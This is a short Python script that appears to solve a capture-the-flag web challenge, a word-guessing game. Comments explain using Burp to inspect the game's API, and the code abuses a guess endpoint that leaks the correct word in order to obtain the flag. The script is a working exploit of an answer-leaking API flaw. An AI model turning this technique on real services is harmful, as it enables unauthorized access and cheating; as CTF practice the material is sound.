import requests

# solved this problem by looking at the endpoints for the api
# played the game with burp to capture what the get and post were returning
# saw that the game made a game_id with the get, used that to post a bs guess
# post with bs guess returns the real answer, made another post with the correct guess that was returned and 
# game_id to get the flag in the post response

url1 = 'https://uscg-web-wordy-w7vmh474ha-uc.a.run.app/api/game'
url2 = 'https://uscg-web-wordy-w7vmh474ha-uc.a.run.app/api/guess'
req = requests.get(url1)

print(req.status_code)
response = req.json()
print(response['game_id'])

guess = 'fesff'
game_id = response['game_id']
myobj = {'guess':guess,'game_id':game_id}
req2 = requests.post(url2,json = myobj)

request2 = req2.json()
print(request2)

myobj = {'guess':request2['correct_word'],'game_id':game_id}

req3 = requests.post(url2,json = myobj)

print(req3.json())
